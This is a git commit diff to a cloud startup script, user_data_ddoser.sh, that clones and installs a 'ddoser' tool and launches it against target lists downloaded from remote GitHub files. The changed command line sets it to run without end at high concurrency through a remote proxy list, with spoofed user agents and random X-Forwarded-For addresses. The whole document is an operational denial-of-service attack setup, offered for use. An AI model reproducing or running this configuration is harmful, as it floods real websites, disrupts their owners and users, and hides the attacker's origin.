f13a80f863497a3bad90df0ffd508d0435065588
Igor Kanyuka <ifelmail@gmail.com>
2022-03-13 16:58:49 -0700

    Made the ddoser parameters the same as in the official docker image

--- user_data_ddoser.sh
+++ user_data_ddoser.sh
@@ -13,4 +13,4 @@ ulimit -n 100000
 git clone https://github.com/taransergey/ddoser.git
 cd ddoser/
 pip3 install -r requirements.txt
-python3 ./ddoser.py --target-urls-file https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt --concurrency 350 --timeout 20 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
+python3 ./ddoser.py --proxy-url 'http://143.244.166.15/proxy.list' --target-urls-file 'https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt' --target-urls-file 'https://github.com/hem017/cytro/raw/master/special_targets.txt' --random-xff-ip --shuffle-proxy --concurrency 300 --count 0 --timeout 20 --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36' --with-random-get-param --restart-period 600 --log-to-stdout
